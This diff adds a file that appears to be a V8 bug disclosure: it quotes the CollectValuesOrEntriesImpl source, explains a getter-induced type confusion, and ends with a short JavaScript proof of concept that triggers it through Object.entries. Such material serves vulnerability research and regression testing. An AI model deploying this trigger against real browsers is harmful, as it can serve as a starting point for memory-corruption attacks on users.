@@ -1,0 +1,53 @@
+/*
+Here's a snippet of the method.
+https://cs.chromium.org/chromium/src/v8/src/elements.cc?rcl=3cbf26e8a21aa76703d2c3c51adb9c96119500da&l=1051
+
+  static Maybe<bool> CollectValuesOrEntriesImpl(
+      Isolate* isolate, Handle<JSObject> object,
+      Handle<FixedArray> values_or_entries, bool get_entries, int* nof_items,
+      PropertyFilter filter) {
+      ...
+    for (int i = 0; i < keys->length(); ++i) {
+      Handle<Object> key(keys->get(i), isolate);
+      Handle<Object> value;
+      uint32_t index;
+      if (!key->ToUint32(&index)) continue;
+      uint32_t entry = Subclass::GetEntryForIndexImpl(
+          isolate, *object, object->elements(), index, filter);
+      if (entry == kMaxUInt32) continue;
+
+      PropertyDetails details = Subclass::GetDetailsImpl(*object, entry);
+
+      if (details.kind() == kData) {
+        value = Subclass::GetImpl(isolate, object->elements(), entry);
+      } else {
+        LookupIterator it(isolate, object, index, LookupIterator::OWN);
+        ASSIGN_RETURN_ON_EXCEPTION_VALUE(
+            isolate, value, Object::GetProperty(&it), Nothing<bool>()); <<------- (a)
+      }
+      if (get_entries) {
+        value = MakeEntryPair(isolate, index, value);
+      }
+      values_or_entries->set(count++, *value);
+    }
+
+    *nof_items = count;
+    return Just(true);
+  }
+
+At (a), the elements kind can be changed by getters. This will lead to type confusion in GetEntryForIndexImpl.
+
+PoC:
+*/
+
+let arr = [];
+arr[1000] = 0x1234;
+
+arr.__defineGetter__(256, function () {
+    delete arr[256];
+
+    arr.unshift(1.1);
+    arr.length = 0;
+});
+
+Object.entries(arr).toString();
